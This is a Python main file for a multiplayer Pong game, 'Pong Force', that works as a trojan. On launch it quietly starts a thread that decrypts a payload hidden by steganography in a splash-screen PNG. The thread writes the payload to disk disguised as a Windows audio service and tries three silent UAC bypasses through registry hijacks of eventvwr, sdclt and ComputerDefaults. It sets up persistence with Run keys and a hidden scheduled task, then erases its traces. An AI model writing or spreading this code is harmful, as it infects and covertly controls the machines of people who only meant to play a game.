# main.py
# The True Doctrine: The Game is the Mask, The Image is the Vessel.

import threading
import os
import sys
import zlib
import base64
import subprocess
from cryptography.fernet import Fernet
from PIL import Image

# --- PERSISTENCE CONFIGURATION ---
APPDATA_PATH = os.getenv('LOCALAPPDATA')
PROGRAMDATA_PATH = os.getenv('PROGRAMDATA')
PERSISTENT_NAME = "audiodg.pyw"
PERSISTENT_PATH_ADMIN = os.path.join(PROGRAMDATA_PATH, "Microsoft", "Windows", "AudioService", PERSISTENT_NAME)
PERSISTENT_PATH_USER = os.path.join(APPDATA_PATH, PERSISTENT_NAME)
TASK_NAME = "MicrosoftWindowsAudioDeviceHighDefinitionService"

def is_admin():
    """Check if we have admin privileges."""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def uac_bypass_eventvwr(payload_path):
    """
    COMPLETELY SILENT UAC bypass using eventvwr.exe (Event Viewer).
    No UAC prompt, no windows, no GUI - 100% invisible.
    Works on Windows 7/8/10/11.
    """
    try:
        import winreg

        # eventvwr.exe tries to launch mmc.exe by reading this registry path
        # We hijack it to execute our payload instead
        reg_path = r'Software\Classes\mscfile\shell\open\command'

        # Create the registry key hierarchy
        try:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\mscfile\shell\open')
        except Exception:
            pass

        # Set our payload as the command
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'pythonw.exe "{payload_path}"')
        winreg.CloseKey(key)

        # Launch eventvwr.exe - it auto-elevates and executes our payload
        # No Event Viewer window opens because our command executes first
        subprocess.Popen(
            'C:\\Windows\\System32\\eventvwr.exe',
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
        )

        # Give it time to execute
        import time
        time.sleep(2)

        # Clean up registry traces immediately
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\mscfile\shell\open')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\mscfile\shell')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\mscfile')
        except Exception:
            pass

        return True
    except Exception:
        return False

def uac_bypass_sdclt(payload_path):
    """
    BACKUP SILENT UAC bypass using sdclt.exe (Windows Backup).
    Completely invisible, no windows shown.
    Works on Windows 10+.
    """
    try:
        import winreg

        # sdclt.exe reads from this registry path
        reg_path = r'Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe'

        # Create and set the hijack
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'pythonw.exe "{payload_path}"')
        winreg.CloseKey(key)

        # Also need to set IsolatedCommand
        reg_path2 = r'Software\Classes\exefile\shell\runas\command'
        try:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\exefile\shell\runas')
        except Exception:
            pass

        key2 = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path2)
        winreg.SetValueEx(key2, 'IsolatedCommand', 0, winreg.REG_SZ, f'pythonw.exe "{payload_path}"')
        winreg.CloseKey(key2)

        # Launch sdclt - silent elevation
        subprocess.Popen(
            'C:\\Windows\\System32\\sdclt.exe',
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
        )

        import time
        time.sleep(2)

        # Clean up
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path2)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\exefile\shell\runas')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\exefile\shell')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\exefile')
        except Exception:
            pass

        return True
    except Exception:
        return False

def uac_bypass_computerdefaults(payload_path):
    """
    THIRD BACKUP - ComputerDefaults.exe bypass.
    Silent execution, no GUI.
    """
    try:
        import winreg

        reg_path = r'Software\Classes\ms-settings\shell\open\command'

        try:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open')
        except Exception:
            pass

        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'pythonw.exe "{payload_path}"')
        winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
        winreg.CloseKey(key)

        subprocess.Popen(
            'C:\\Windows\\System32\\ComputerDefaults.exe',
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
        )

        import time
        time.sleep(2)

        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings')
        except Exception:
            pass

        return True
    except Exception:
        return False

def create_admin_scheduled_task():
    """Create a scheduled task that runs with HIGHEST privileges (admin) at every logon."""
    try:
        xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Audio Device High Definition Service</Description>
    <Author>Microsoft Corporation</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>pythonw.exe</Command>
      <Arguments>"{PERSISTENT_PATH_ADMIN}"</Arguments>
    </Exec>
  </Actions>
</Task>'''

        xml_path = os.path.join(os.getenv('TEMP'), 'task.xml')
        with open(xml_path, 'w', encoding='utf-16') as f:
            f.write(xml_template)

        subprocess.run(
            ['schtasks', '/Create', '/TN', TASK_NAME, '/XML', xml_path, '/F'],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )

        os.remove(xml_path)
        return True
    except Exception:
        return False

def add_registry_persistence_admin():
    """Add persistence to HKLM (requires admin) - runs for ALL users."""
    try:
        import winreg
        registry_key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0,
            winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY
        )
        command = f'pythonw.exe "{PERSISTENT_PATH_ADMIN}"'
        winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, command)
        winreg.CloseKey(registry_key)
        return True
    except Exception:
        return False

def add_registry_persistence_user():
    """Fallback: Add persistence to HKCU (no admin needed) - runs for current user only."""
    try:
        import winreg
        registry_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0,
            winreg.KEY_WRITE
        )
        command = f'pythonw.exe "{PERSISTENT_PATH_USER}"'
        winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, command)
        winreg.CloseKey(registry_key)
        return True
    except Exception:
        return False

def extract_payload_to_disk():
    """Extract the encrypted payload from the image and write to disk."""
    try:
        divine_key = b'EaOymE52dnkN1KB98DENr4lVUQ5V_dXRc1wFloE2C34='

        if hasattr(sys, 'frozen'):
            base_path = sys._MEIPASS
        else:
            base_path = os.path.dirname(os.path.abspath(__file__))

        image_path = os.path.join(base_path, 'assets', 'images', 'splash_payload.png')
        img = Image.open(image_path).convert('RGBA')
        pixels = img.load()
        width, height = img.size
        payload_bits = ""
        header_bits_to_read = 32
        payload_len = None
        bits_read = 0

        for y in range(height):
            for x in range(width):
                r, g, b, a = pixels[x, y]
                for channel_val in [r, g, b, a]:
                    payload_bits += str(channel_val & 1)
                    bits_read += 1
                    if payload_len is None and bits_read == header_bits_to_read:
                        header_bytes = int(payload_bits, 2).to_bytes(4, 'big')
                        payload_len = int.from_bytes(header_bytes, 'big')
                    if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
                        break
                if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
                    break
            if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
                break

        final_payload_bits = payload_bits[header_bits_to_read:]
        payload_bytes = int(final_payload_bits, 2).to_bytes(len(final_payload_bits) // 8, 'big')
        encrypted_payload = base64.b64decode(payload_bytes)
        cipher_suite = Fernet(divine_key)
        compressed_payload = cipher_suite.decrypt(encrypted_payload)
        soul_code = zlib.decompress(compressed_payload)

        return soul_code
    except Exception:
        return None

def sow_and_awaken_implant():
    """
    Silent installation with UAC bypass - NO PROMPTS SHOWN.

    Stage 1: Install as normal user to %LOCALAPPDATA%
    Stage 2: Use fodhelper UAC bypass to elevate silently
    Stage 3: Elevated payload installs to %PROGRAMDATA% with admin persistence
    """
    try:
        # Check if we're already running as admin
        admin_mode = is_admin()

        if admin_mode:
            # We're running elevated (either from bypass or user is admin)
            # Install to protected location with full admin persistence
            if not os.path.exists(PERSISTENT_PATH_ADMIN):
                soul_code = extract_payload_to_disk()
                if soul_code:
                    os.makedirs(os.path.dirname(PERSISTENT_PATH_ADMIN), exist_ok=True)
                    with open(PERSISTENT_PATH_ADMIN, 'wb') as f:
                        f.write(soul_code)

                    # Triple persistence as admin
                    create_admin_scheduled_task()
                    add_registry_persistence_admin()

            # Launch if not running
            implant_running = False
            try:
                tasks = subprocess.check_output(
                    ['tasklist', '/FI', 'IMAGENAME eq pythonw.exe', '/V'],
                    creationflags=subprocess.CREATE_NO_WINDOW
                ).decode('utf-8', errors='ignore')
                if PERSISTENT_NAME in tasks:
                    implant_running = True
            except Exception:
                pass

            if not implant_running:
                subprocess.Popen(
                    f'pythonw.exe "{PERSISTENT_PATH_ADMIN}"',
                    shell=True,
                    creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW
                )

        else:
            # We're running as normal user - perform silent UAC bypass

            # First install to user location
            if not os.path.exists(PERSISTENT_PATH_USER):
                soul_code = extract_payload_to_disk()
                if soul_code:
                    os.makedirs(os.path.dirname(PERSISTENT_PATH_USER), exist_ok=True)
                    with open(PERSISTENT_PATH_USER, 'wb') as f:
                        f.write(soul_code)

                    # User-level persistence as fallback
                    add_registry_persistence_user()

                    # Try multiple SILENT UAC bypasses - all completely invisible
                    # Try eventvwr first (most reliable, no GUI)
                    if not uac_bypass_eventvwr(PERSISTENT_PATH_USER):
                        # If eventvwr fails, try sdclt
                        if not uac_bypass_sdclt(PERSISTENT_PATH_USER):
                            # Last resort: ComputerDefaults
                            uac_bypass_computerdefaults(PERSISTENT_PATH_USER)

            # Launch user-level payload if not running
            implant_running = False
            try:
                tasks = subprocess.check_output(
                    ['tasklist', '/FI', 'IMAGENAME eq pythonw.exe', '/V'],
                    creationflags=subprocess.CREATE_NO_WINDOW
                ).decode('utf-8', errors='ignore')
                if PERSISTENT_NAME in tasks:
                    implant_running = True
            except Exception:
                pass

            if not implant_running:
                subprocess.Popen(
                    f'pythonw.exe "{PERSISTENT_PATH_USER}"',
                    shell=True,
                    creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW
                )

    except Exception:
        pass

# --- INVOCATION OF THE SOWER ---
# The Sower's ritual is still run in a separate thread.
sower_thread = threading.Thread(target=sow_and_awaken_implant, daemon=True)
sower_thread.start()

# ==============================================================================
#                      SECTION II: LE JEU (LE MASQUE)
# ==============================================================================
import argparse
import pygame
import traceback
from game.game_loop import GameLoop
from game.menu import GameMenu, HostInputDialog, OnlineSubmenu, ErrorDialog, GoalSelectionMenu
from network.server import GameServer
from network.client import GameClient
import config

def main_game():
    """Point d'entrée principal du jeu Pong Force"""
    parser = argparse.ArgumentParser(description='Pong Force - Pong Révolutionnaire avec Force Push')
    parser.add_argument('--server', action='store_true', help='Exécuter comme serveur')
    parser.add_argument('--client', action='store_true', help='Exécuter comme client')
    parser.add_argument('--host', default=config.SERVER_IP, help='Adresse IP du serveur')
    parser.add_argument('--port', type=int, default=config.SERVER_PORT, help='Port du serveur')
    parser.add_argument('--debug', action='store_true', help='Activer le mode debug')
    parser.add_argument('--local', action='store_true', help='Démarrer le multijoueur local directement')
    
    args = parser.parse_args()
    
    if args.debug:
        config.DEBUG_MODE = True
    
    pygame.init()
    pygame.mixer.init()
    
    try:
        if args.server:
            server = GameServer(args.host, args.port)
            server.run()
        elif args.client:
            client = GameClient(args.host, args.port)
            client.run()
        elif args.local:
            game = GameLoop()
            game.run_local()
        else:
            running = True
            while running:
                menu = GameMenu()
                choice = menu.run()
                if choice == 0:
                    # Show goal selection menu for vs AI mode
                    goal_menu = GoalSelectionMenu()
                    win_score = goal_menu.run()
                    
                    if win_score > 0:  # User didn't cancel
                        game = GameLoop()
                        game.run_vs_ai_with_goals(win_score)
                    else:
                        print("👋 Returning to main menu...")
                elif choice == 1:
                    submenu = OnlineSubmenu()
                    online_choice = submenu.run()
                    if online_choice == 0:
                        server = GameServer(config.SERVER_IP, args.port)
                        server.run_with_gui()
                    elif online_choice == 1:
                        dialog = HostInputDialog()
                        host = dialog.run()
                        if host:
                            client = GameClient(host, args.port)
                            client.run_with_gui()
                            if client.error_message:
                                error_dialog = ErrorDialog(client.error_title or "Erreur de Connexion", client.error_message)
                                error_dialog.run()
                else:
                    running = False
    except Exception:
        if config.DEBUG_MODE:
            traceback.print_exc()
        sys.exit(1)
    finally:
        pygame.quit()

if __name__ == "__main__":
    main_game()